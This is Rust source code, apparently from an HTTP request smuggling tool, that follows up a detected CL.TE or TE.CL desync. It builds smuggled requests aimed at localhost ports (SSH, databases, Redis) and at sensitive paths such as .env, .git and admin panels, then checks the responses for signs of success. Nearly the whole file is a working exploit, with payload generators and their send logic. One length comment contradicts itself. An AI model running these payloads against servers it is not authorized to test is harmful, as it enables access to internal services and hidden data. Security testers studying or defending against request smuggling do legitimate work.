use crate::error::{Result, SmugglexError};
use crate::http::send_request;
use crate::model::CheckResult;
use colored::*;
use std::time::Duration;

// HTTP status codes for localhost access detection
const HTTP_FORBIDDEN: u16 = 403;
const HTTP_MISDIRECTED_REQUEST: u16 = 421;
const HTTP_BAD_GATEWAY: u16 = 502;
const HTTP_SERVICE_UNAVAILABLE: u16 = 503;
const HTTP_GATEWAY_TIMEOUT: u16 = 504;

/// Detected vulnerability information for exploitation
#[derive(Debug, Clone)]
pub struct VulnerabilityContext {
    pub vuln_type: String,
    pub payload: String,
    pub payload_index: usize,
}

/// Result of a localhost access attempt
#[derive(Debug)]
pub struct LocalhostAccessResult {
    pub port: u16,
    pub success: bool,
    pub reason: String,
    pub response_status: Option<String>,
    pub response_body: Option<String>,
}

/// Test localhost access using detected smuggling vulnerability
pub async fn test_localhost_access(
    host: &str,
    port: u16,
    path: &str,
    use_tls: bool,
    timeout: u64,
    verbose: bool,
    vuln_ctx: &VulnerabilityContext,
    localhost_ports: &[u16],
) -> Result<Vec<LocalhostAccessResult>> {
    let mut results = Vec::new();

    // Get baseline response for comparison
    let baseline_request = format!(
        "GET {} HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n",
        path, host
    );
    let (baseline_response, baseline_duration) =
        send_request(host, port, &baseline_request, timeout, verbose, use_tls).await?;
    let baseline_status = baseline_response.lines().next().unwrap_or("").to_string();
    let baseline_body = extract_body(&baseline_response);

    if verbose {
        println!(
            "\n{} Baseline response: {} ({}ms)",
            "[*]".cyan(),
            baseline_status.bold(),
            baseline_duration.as_millis()
        );
    }

    // Test each localhost port
    for &localhost_port in localhost_ports {
        if verbose {
            println!(
                "\n{} Testing localhost access on port {}...",
                "[*]".cyan(),
                localhost_port.to_string().yellow()
            );
        }

        let result = test_single_port(
            host,
            port,
            path,
            use_tls,
            timeout,
            verbose,
            vuln_ctx,
            localhost_port,
            &baseline_status,
            &baseline_body,
            baseline_duration,
        )
        .await?;

        results.push(result);
    }

    Ok(results)
}

async fn test_single_port(
    host: &str,
    port: u16,
    path: &str,
    use_tls: bool,
    timeout: u64,
    verbose: bool,
    vuln_ctx: &VulnerabilityContext,
    localhost_port: u16,
    baseline_status: &str,
    baseline_body: &str,
    baseline_duration: Duration,
) -> Result<LocalhostAccessResult> {
    // Generate localhost access payload based on vulnerability type
    let smuggling_payload =
        generate_localhost_payload(vuln_ctx, path, host, localhost_port, verbose);

    // Send the smuggling payload
    match send_request(host, port, &smuggling_payload, timeout, verbose, use_tls).await {
        Ok((_smuggling_response, _)) => {
            if verbose {
                println!("  {} Smuggling payload sent", "[+]".green());
            }

            // Send probe request to observe backend response
            tokio::time::sleep(Duration::from_millis(100)).await;
            let probe_request = format!(
                "GET {} HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n",
                path, host
            );

            match send_request(host, port, &probe_request, timeout, verbose, use_tls).await {
                Ok((probe_response, probe_duration)) => {
                    let probe_status = probe_response.lines().next().unwrap_or("").to_string();
                    let probe_body = extract_body(&probe_response);

                    // Analyze response to detect localhost access
                    analyze_localhost_response(
                        localhost_port,
                        &probe_status,
                        &probe_body,
                        probe_duration,
                        baseline_status,
                        baseline_body,
                        baseline_duration,
                        verbose,
                    )
                }
                Err(e) => {
                    // Connection errors might indicate successful smuggling
                    if matches!(e, SmugglexError::Timeout(_)) {
                        Ok(LocalhostAccessResult {
                            port: localhost_port,
                            success: true,
                            reason: "Connection timeout after smuggling (possible localhost access)"
                                .to_string(),
                            response_status: None,
                            response_body: None,
                        })
                    } else {
                        Ok(LocalhostAccessResult {
                            port: localhost_port,
                            success: false,
                            reason: format!("Probe request failed: {}", e),
                            response_status: None,
                            response_body: None,
                        })
                    }
                }
            }
        }
        Err(e) => Ok(LocalhostAccessResult {
            port: localhost_port,
            success: false,
            reason: format!("Smuggling request failed: {}", e),
            response_status: None,
            response_body: None,
        }),
    }
}

fn generate_localhost_payload(
    vuln_ctx: &VulnerabilityContext,
    path: &str,
    host: &str,
    localhost_port: u16,
    verbose: bool,
) -> String {
    let vuln_type_lower = vuln_ctx.vuln_type.to_lowercase();

    let payload = if vuln_type_lower.contains("cl-te") || vuln_type_lower.contains("clte") {
        // CL.TE: Front-end uses Content-Length, back-end uses Transfer-Encoding
        // We smuggle a request to localhost in the chunked body
        generate_clte_localhost_payload(path, host, localhost_port)
    } else if vuln_type_lower.contains("te-cl") || vuln_type_lower.contains("tecl") {
        // TE.CL: Front-end uses Transfer-Encoding, back-end uses Content-Length
        // We smuggle a request to localhost after the chunked body
        generate_tecl_localhost_payload(path, host, localhost_port)
    } else {
        // Fallback: try CL.TE approach
        if verbose {
            println!(
                "  {} Unknown vulnerability type '{}', using CL.TE approach",
                "[!]".yellow(),
                vuln_ctx.vuln_type
            );
        }
        generate_clte_localhost_payload(path, host, localhost_port)
    };

    if verbose {
        println!("  {} Generated localhost payload for port {}", "[*]".cyan(), localhost_port);
    }

    payload
}

fn generate_clte_localhost_payload(path: &str, host: &str, localhost_port: u16) -> String {
    // CL.TE payload structure:
    // Front-end reads Content-Length bytes
    // Back-end reads chunked encoding and processes smuggled request
    let smuggled_request = format!(
        "GET / HTTP/1.1\r\n\
         Host: 127.0.0.1:{}\r\n\
         Connection: close\r\n\
         \r\n",
        localhost_port
    );

    format!(
        "POST {} HTTP/1.1\r\n\
         Host: {}\r\n\
         Connection: keep-alive\r\n\
         Content-Length: {}\r\n\
         Transfer-Encoding: chunked\r\n\
         \r\n\
         0\r\n\
         \r\n\
         {}",
        path,
        host,
        smuggled_request.len() + 6, // 0\r\n\r\n + smuggled_request length
        smuggled_request
    )
}

fn generate_tecl_localhost_payload(path: &str, host: &str, localhost_port: u16) -> String {
    // TE.CL payload structure:
    // Front-end reads Transfer-Encoding (chunked)
    // Back-end reads Content-Length and leaves remainder in buffer
    let smuggled_request = format!(
        "GET / HTTP/1.1\r\n\
         Host: 127.0.0.1:{}\r\n\
         Connection: close\r\n\
         \r\n",
        localhost_port
    );

    let chunk_data = "X";
    let chunk_size = format!("{:x}", chunk_data.len());

    format!(
        "POST {} HTTP/1.1\r\n\
         Host: {}\r\n\
         Connection: keep-alive\r\n\
         Content-Length: {}\r\n\
         Transfer-Encoding: chunked\r\n\
         \r\n\
         {}\r\n\
         {}\r\n\
         0\r\n\
         \r\n\
         {}",
        path,
        host,
        chunk_size.len() + chunk_data.len() + 4, // chunk_size + \r\n + data + \r\n
        chunk_size,
        chunk_data,
        smuggled_request
    )
}

fn extract_body(response: &str) -> String {
    // Extract body from HTTP response
    if let Some(body_start) = response.find("\r\n\r\n") {
        response[body_start + 4..].to_string()
    } else {
        String::new()
    }
}

fn analyze_localhost_response(
    localhost_port: u16,
    probe_status: &str,
    probe_body: &str,
    probe_duration: Duration,
    baseline_status: &str,
    baseline_body: &str,
    baseline_duration: Duration,
    verbose: bool,
) -> Result<LocalhostAccessResult> {
    let mut success_indicators = Vec::new();

    // Check for status code changes
    let probe_code = extract_status_code(probe_status);
    let baseline_code = extract_status_code(baseline_status);

    if probe_code != baseline_code {
        success_indicators.push(format!(
            "Status code changed from {} to {}",
            baseline_code.unwrap_or(0),
            probe_code.unwrap_or(0)
        ));
    }

    // Check for specific error codes indicating internal access attempts
    if let Some(code) = probe_code
        && matches!(
            code,
            HTTP_BAD_GATEWAY
                | HTTP_SERVICE_UNAVAILABLE
                | HTTP_GATEWAY_TIMEOUT
                | HTTP_FORBIDDEN
                | HTTP_MISDIRECTED_REQUEST
        )
    {
        success_indicators.push(format!(
            "Received error code {} (possible internal routing)",
            code
        ));
    }

    // Check for localhost service signatures in response
    let localhost_signatures = get_localhost_signatures(localhost_port);
    for signature in &localhost_signatures {
        if probe_body.contains(signature) && !baseline_body.contains(signature) {
            success_indicators.push(format!("Found signature '{}' in response", signature));
        }
    }

    // Check for connection/routing errors in body
    let error_keywords = [
        "Connection refused",
        "Connection reset",
        "No route to host",
        "Host is unreachable",
        "Bad Gateway",
        "Service Unavailable",
        "Gateway Timeout",
        "Unable to connect",
        "Connection timeout",
        "upstream",
        "backend",
        "127.0.0.1",
        "localhost",
    ];

    for keyword in &error_keywords {
        if probe_body.contains(keyword) && !baseline_body.contains(keyword) {
            success_indicators
                .push(format!("Found error keyword '{}' in response body", keyword));
        }
    }

    // Check for significant timing differences
    let timing_diff = probe_duration.as_millis() as i128 - baseline_duration.as_millis() as i128;
    if timing_diff.abs() > 1000 {
        // More than 1 second difference
        success_indicators.push(format!("Significant timing difference: {}ms", timing_diff));
    }

    let success = !success_indicators.is_empty();
    let reason = if success {
        success_indicators.join("; ")
    } else {
        "No indicators of localhost access detected".to_string()
    };

    if verbose {
        if success {
            println!("  {} Indicators found: {}", "[+]".green(), reason);
        } else {
            println!("  {} No indicators found", "[-]".red());
        }
    }

    Ok(LocalhostAccessResult {
        port: localhost_port,
        success,
        reason,
        response_status: Some(probe_status.to_string()),
        response_body: Some(probe_body.to_string()),
    })
}

fn extract_status_code(status_line: &str) -> Option<u16> {
    let parts: Vec<&str> = status_line.split_whitespace().collect();
    if parts.len() >= 2 && (parts[0].starts_with("HTTP/1.") || parts[0].starts_with("HTTP/2")) {
        parts[1].parse::<u16>().ok()
    } else {
        None
    }
}

fn get_localhost_signatures(port: u16) -> Vec<String> {
    match port {
        22 => vec![
            "SSH-2.0".to_string(),
            "SSH-1.".to_string(),
            "OpenSSH".to_string(),
        ],
        80 | 8080 => vec![
            "Apache".to_string(),
            "nginx".to_string(),
            "Server:".to_string(),
        ],
        443 => vec![
            "SSL handshake".to_string(),
            "TLS alert".to_string(),
            "certificate".to_string(),
        ],
        3306 => vec!["MySQL".to_string(), "MariaDB".to_string()],
        5432 => vec!["PostgreSQL".to_string()],
        6379 => vec!["Redis".to_string()],
        27017 => vec!["MongoDB".to_string()],
        _ => vec![],
    }
}

/// Print localhost access results in a formatted way
pub fn print_localhost_results(results: &[LocalhostAccessResult], target_url: &str) {
    let successful: Vec<_> = results.iter().filter(|r| r.success).collect();

    println!("\n{}", "=== Localhost Access Exploit Results ===".bold());
    println!("{} {}", "Target:".bold(), target_url);
    println!(
        "{} {}/{}",
        "Success Rate:".bold(),
        successful.len(),
        results.len()
    );
    println!();

    if successful.is_empty() {
        println!(
            "{} No successful localhost access detected on any tested port",
            "[-]".red().bold()
        );
    } else {
        for result in &successful {
            println!(
                "{} {} on port {}",
                "[+]".green().bold(),
                "Localhost Access Successful".green().bold(),
                result.port.to_string().yellow().bold()
            );
            println!("  {} {}", "Reason:".bold(), result.reason);
            if let Some(ref status) = result.response_status {
                println!("  {} {}", "Response Status:".bold(), status);
            }
            println!();
        }
    }

    // Show failed attempts if verbose or all failed
    if successful.len() < results.len() {
        println!("{}", "Failed Attempts:".bold());
        for result in results.iter().filter(|r| !r.success) {
            println!(
                "{} Port {} - {}",
                "[-]".red(),
                result.port,
                result.reason.dimmed()
            );
        }
    }
}

/// Extract vulnerability context from detected vulnerabilities
pub fn extract_vulnerability_context(results: &[CheckResult]) -> Option<VulnerabilityContext> {
    // Find first vulnerable result
    results
        .iter()
        .find(|r| r.vulnerable)
        .and_then(|r| {
            r.payload.as_ref().map(|payload| VulnerabilityContext {
                vuln_type: r.check_type.clone(),
                payload: payload.clone(),
                payload_index: r.payload_index.unwrap_or(0),
            })
        })
}

// ============================================================================
// Path Fuzz Exploit
// ============================================================================

/// Default paths to fuzz when no wordlist is provided
const DEFAULT_PATHS: &[&str] = &[
    "admin",
    "administrator",
    "admin.php",
    "admin.html",
    "admin/login",
    "login",
    "dashboard",
    "panel",
    "cpanel",
    "manager",
    "manage",
    "management",
    "console",
    "config",
    "configuration",
    "settings",
    "setup",
    "install",
    "backup",
    "backups",
    "test",
    "testing",
    "debug",
    "dev",
    "development",
    "staging",
    "api",
    "api/v1",
    "api/v2",
    "internal",
    "private",
    "secret",
    "hidden",
    "secure",
    "status",
    "health",
    "healthcheck",
    "metrics",
    "monitor",
    "monitoring",
    "phpmyadmin",
    "phpMyAdmin",
    "pma",
    "mysql",
    "database",
    "db",
    "sql",
    "server-status",
    "server-info",
    ".git",
    ".env",
    ".htaccess",
    "robots.txt",
    "sitemap.xml",
    "wp-admin",
    "wp-login.php",
    "wordpress",
];

/// Result of a path fuzz attempt
#[derive(Debug)]
pub struct PathFuzzResult {
    pub path: String,
    pub found: bool,
    pub reason: String,
    pub response_status: Option<String>,
    pub response_body_preview: Option<String>,
}

/// Get paths to fuzz from wordlist file or use defaults
pub fn get_fuzz_paths(wordlist_path: Option<&str>) -> Result<Vec<String>> {
    if let Some(path) = wordlist_path {
        let content = std::fs::read_to_string(path).map_err(|e| {
            SmugglexError::Io(format!(
                "Failed to read wordlist file '{}': {} ({})",
                path,
                e,
                e.kind()
            ))
        })?;
        let paths: Vec<String> = content
            .lines()
            .map(|line| line.trim())
            .filter(|line| !line.is_empty() && !line.starts_with('#'))
            .map(|line| {
                // Ensure path starts with /
                if line.starts_with('/') {
                    line.to_string()
                } else {
                    format!("/{}", line)
                }
            })
            .collect();

        if paths.is_empty() {
            return Err(SmugglexError::InvalidInput(
                "Wordlist file is empty or contains no valid paths".to_string(),
            ));
        }
        Ok(paths)
    } else {
        Ok(DEFAULT_PATHS
            .iter()
            .map(|p| format!("/{}", p))
            .collect())
    }
}

/// Test hidden paths using detected smuggling vulnerability
pub async fn test_path_fuzz(
    host: &str,
    port: u16,
    path: &str,
    use_tls: bool,
    timeout: u64,
    verbose: bool,
    vuln_ctx: &VulnerabilityContext,
    fuzz_paths: &[String],
) -> Result<Vec<PathFuzzResult>> {
    let mut results = Vec::new();

    // Get baseline response for comparison
    let baseline_request = format!(
        "GET {} HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n",
        path, host
    );
    let (baseline_response, baseline_duration) =
        send_request(host, port, &baseline_request, timeout, verbose, use_tls).await?;
    let baseline_status = extract_status_code(baseline_response.lines().next().unwrap_or(""));
    let baseline_body = extract_body(&baseline_response);

    if verbose {
        println!(
            "\n{} Baseline response: {} ({}ms)",
            "[*]".cyan(),
            baseline_status.map_or("N/A".to_string(), |s| s.to_string()).bold(),
            baseline_duration.as_millis()
        );
    }

    // Test each path
    for fuzz_path in fuzz_paths {
        if verbose {
            println!(
                "\n{} Testing path: {}",
                "[*]".cyan(),
                fuzz_path.yellow()
            );
        }

        let result = test_single_path(
            host,
            port,
            path,
            use_tls,
            timeout,
            verbose,
            vuln_ctx,
            fuzz_path,
            baseline_status,
            &baseline_body,
            baseline_duration,
        )
        .await?;

        results.push(result);
    }

    Ok(results)
}

async fn test_single_path(
    host: &str,
    port: u16,
    _original_path: &str,
    use_tls: bool,
    timeout: u64,
    verbose: bool,
    vuln_ctx: &VulnerabilityContext,
    fuzz_path: &str,
    baseline_status: Option<u16>,
    baseline_body: &str,
    baseline_duration: Duration,
) -> Result<PathFuzzResult> {
    // Generate path fuzz payload based on vulnerability type
    let smuggling_payload = generate_path_fuzz_payload(vuln_ctx, fuzz_path, host, verbose);

    // Send the smuggling payload
    match send_request(host, port, &smuggling_payload, timeout, verbose, use_tls).await {
        Ok((_smuggling_response, _)) => {
            if verbose {
                println!("  {} Smuggling payload sent", "[+]".green());
            }

            // Wait a bit for the smuggled request to be processed
            tokio::time::sleep(Duration::from_millis(100)).await;

            // Send probe request to observe backend response
            let probe_request = format!(
                "GET / HTTP/1.1\r\nHost: {}\r\nConnection: close\r\n\r\n",
                host
            );

            match send_request(host, port, &probe_request, timeout, verbose, use_tls).await {
                Ok((probe_response, probe_duration)) => {
                    let probe_status_line = probe_response.lines().next().unwrap_or("");
                    let probe_status = extract_status_code(probe_status_line);
                    let probe_body = extract_body(&probe_response);

                    // Analyze response to detect hidden path discovery
                    analyze_path_fuzz_response(
                        fuzz_path,
                        probe_status,
                        &probe_body,
                        probe_duration,
                        baseline_status,
                        baseline_body,
                        baseline_duration,
                        verbose,
                    )
                }
                Err(e) => {
                    // Connection errors might indicate something interesting
                    if matches!(e, SmugglexError::Timeout(_)) {
                        Ok(PathFuzzResult {
                            path: fuzz_path.to_string(),
                            found: true,
                            reason: "Connection timeout (possible path processing delay)".to_string(),
                            response_status: None,
                            response_body_preview: None,
                        })
                    } else {
                        Ok(PathFuzzResult {
                            path: fuzz_path.to_string(),
                            found: false,
                            reason: format!("Probe request failed: {}", e),
                            response_status: None,
                            response_body_preview: None,
                        })
                    }
                }
            }
        }
        Err(e) => Ok(PathFuzzResult {
            path: fuzz_path.to_string(),
            found: false,
            reason: format!("Smuggling request failed: {}", e),
            response_status: None,
            response_body_preview: None,
        }),
    }
}

fn generate_path_fuzz_payload(
    vuln_ctx: &VulnerabilityContext,
    fuzz_path: &str,
    host: &str,
    verbose: bool,
) -> String {
    let vuln_type_lower = vuln_ctx.vuln_type.to_lowercase();

    let payload = if vuln_type_lower.contains("cl-te") || vuln_type_lower.contains("clte") {
        // CL.TE: Front-end uses Content-Length, back-end uses Transfer-Encoding
        // We smuggle a request to the hidden path
        generate_clte_path_fuzz_payload(fuzz_path, host)
    } else if vuln_type_lower.contains("te-cl") || vuln_type_lower.contains("tecl") {
        // TE.CL: Front-end uses Transfer-Encoding, back-end uses Content-Length
        // We smuggle a request to the hidden path
        generate_tecl_path_fuzz_payload(fuzz_path, host)
    } else {
        // Fallback: try CL.TE approach
        if verbose {
            println!(
                "  {} Unknown vulnerability type '{}', using CL.TE approach",
                "[!]".yellow(),
                vuln_ctx.vuln_type
            );
        }
        generate_clte_path_fuzz_payload(fuzz_path, host)
    };

    if verbose {
        println!("  {} Generated path fuzz payload for {}", "[*]".cyan(), fuzz_path);
    }

    payload
}

fn generate_clte_path_fuzz_payload(fuzz_path: &str, host: &str) -> String {
    // CL.TE payload structure:
    // Front-end reads Content-Length bytes
    // Back-end reads chunked encoding and processes smuggled request
    let smuggled_request = format!(
        "GET {} HTTP/1.1\r\n\
         Host: {}\r\n\
         Connection: close\r\n\
         \r\n",
        fuzz_path, host
    );

    // Chunked terminator "0\r\n\r\n" length = 5 bytes, but Content-Length needs to account
    // for the smuggled request being after the chunked encoding boundary
    const CHUNKED_TERMINATOR_LEN: usize = 6; // "0\r\n" (3) + "\r\n" (2) + space before smuggled (1)

    format!(
        "POST / HTTP/1.1\r\n\
         Host: {}\r\n\
         Connection: keep-alive\r\n\
         Content-Length: {}\r\n\
         Transfer-Encoding: chunked\r\n\
         \r\n\
         0\r\n\
         \r\n\
         {}",
        host,
        smuggled_request.len() + CHUNKED_TERMINATOR_LEN,
        smuggled_request
    )
}

fn generate_tecl_path_fuzz_payload(fuzz_path: &str, host: &str) -> String {
    // TE.CL payload structure:
    // Front-end reads Transfer-Encoding (chunked)
    // Back-end reads Content-Length and leaves remainder in buffer
    let smuggled_request = format!(
        "GET {} HTTP/1.1\r\n\
         Host: {}\r\n\
         Connection: close\r\n\
         \r\n",
        fuzz_path, host
    );

    let chunk_data = "X";
    let chunk_size = format!("{:x}", chunk_data.len());
    // Line endings: chunk_size + "\r\n" + chunk_data + "\r\n" = 2 CRLF sequences
    const CRLF_SEQUENCES_LEN: usize = 4; // "\r\n" (2) + "\r\n" (2)

    format!(
        "POST / HTTP/1.1\r\n\
         Host: {}\r\n\
         Connection: keep-alive\r\n\
         Content-Length: {}\r\n\
         Transfer-Encoding: chunked\r\n\
         \r\n\
         {}\r\n\
         {}\r\n\
         0\r\n\
         \r\n\
         {}",
        host,
        chunk_size.len() + chunk_data.len() + CRLF_SEQUENCES_LEN,
        chunk_size,
        chunk_data,
        smuggled_request
    )
}

fn analyze_path_fuzz_response(
    fuzz_path: &str,
    probe_status: Option<u16>,
    probe_body: &str,
    probe_duration: Duration,
    baseline_status: Option<u16>,
    baseline_body: &str,
    baseline_duration: Duration,
    verbose: bool,
) -> Result<PathFuzzResult> {
    let mut success_indicators = Vec::new();

    // Check for status code changes indicating path existence
    if probe_status != baseline_status {
        // Interesting status code changes
        match probe_status {
            // 200 OK from a hidden path is most interesting
            Some(200) if baseline_status != Some(200) => {
                success_indicators.push(format!(
                    "Status changed to 200 OK (from {})",
                    baseline_status.map_or("N/A".to_string(), |s| s.to_string())
                ));
            }
            // 301/302 redirects might indicate path exists
            Some(301) | Some(302) => {
                success_indicators.push(format!(
                    "Received redirect ({})",
                    probe_status.unwrap()
                ));
            }
            // 401/403 might indicate protected but existing path
            Some(401) | Some(403) if baseline_status != Some(401) && baseline_status != Some(403) => {
                success_indicators.push(format!(
                    "Authentication/authorization required ({})",
                    probe_status.unwrap()
                ));
            }
            // 500 errors might indicate path exists but has backend issues
            Some(500) if baseline_status != Some(500) => {
                success_indicators.push("Internal server error (path might exist)".to_string());
            }
            _ => {
                // Other status changes are still worth noting
                success_indicators.push(format!(
                    "Status changed from {} to {}",
                    baseline_status.map_or("N/A".to_string(), |s| s.to_string()),
                    probe_status.map_or("N/A".to_string(), |s| s.to_string())
                ));
            }
        }
    }

    // Check for significant body changes
    if probe_body.len() != baseline_body.len() {
        let diff = (probe_body.len() as i64 - baseline_body.len() as i64).abs();
        if diff > 100 {
            success_indicators.push(format!(
                "Response body size changed significantly ({} bytes difference)",
                diff
            ));
        }
    }

    // Check for path-related keywords in response that weren't in baseline
    let path_keywords = [
        "admin", "dashboard", "panel", "login", "forbidden",
        "unauthorized", "denied", "protected", "private", "internal",
    ];
    for keyword in &path_keywords {
        let keyword_lower = keyword.to_lowercase();
        if probe_body.to_lowercase().contains(&keyword_lower)
            && !baseline_body.to_lowercase().contains(&keyword_lower)
        {
            success_indicators.push(format!("Found keyword '{}' in response", keyword));
        }
    }

    // Check for significant timing differences
    let timing_diff = probe_duration.as_millis() as i128 - baseline_duration.as_millis() as i128;
    if timing_diff.abs() > 1000 {
        success_indicators.push(format!("Significant timing difference: {}ms", timing_diff));
    }

    let found = !success_indicators.is_empty();
    let reason = if found {
        success_indicators.join("; ")
    } else {
        "No indicators of hidden path".to_string()
    };

    if verbose {
        if found {
            println!("  {} Indicators found: {}", "[+]".green(), reason);
        } else {
            println!("  {} No indicators found", "[-]".red());
        }
    }

    // Get body preview (first 200 chars)
    let body_preview = if found && !probe_body.is_empty() {
        Some(if probe_body.len() > 200 {
            format!("{}...", &probe_body[..200])
        } else {
            probe_body.to_string()
        })
    } else {
        None
    };

    Ok(PathFuzzResult {
        path: fuzz_path.to_string(),
        found,
        reason,
        response_status: probe_status.map(|s| format!("HTTP {}", s)),
        response_body_preview: body_preview,
    })
}

/// Print path fuzz results in a formatted way
pub fn print_path_fuzz_results(results: &[PathFuzzResult], target_url: &str) {
    let found_paths: Vec<_> = results.iter().filter(|r| r.found).collect();

    println!("\n{}", "=== Path Fuzz Exploit Results ===".bold());
    println!("{} {}", "Target:".bold(), target_url);
    println!(
        "{} {}/{}",
        "Paths Found:".bold(),
        found_paths.len(),
        results.len()
    );
    println!();

    if found_paths.is_empty() {
        println!(
            "{} No hidden paths discovered",
            "[-]".red().bold()
        );
    } else {
        for result in &found_paths {
            println!(
                "{} {} {}",
                "[+]".green().bold(),
                "Hidden Path Found:".green().bold(),
                result.path.yellow().bold()
            );
            println!("  {} {}", "Reason:".bold(), result.reason);
            if let Some(ref status) = result.response_status {
                println!("  {} {}", "Response Status:".bold(), status);
            }
            if let Some(ref preview) = result.response_body_preview {
                println!("  {} {}", "Body Preview:".bold(), preview.dimmed());
            }
            println!();
        }
    }

    // Show failed attempts count
    let failed_count = results.len() - found_paths.len();
    if failed_count > 0 {
        println!(
            "{} {} paths showed no indicators",
            "[-]".red(),
            failed_count
        );
    }
}
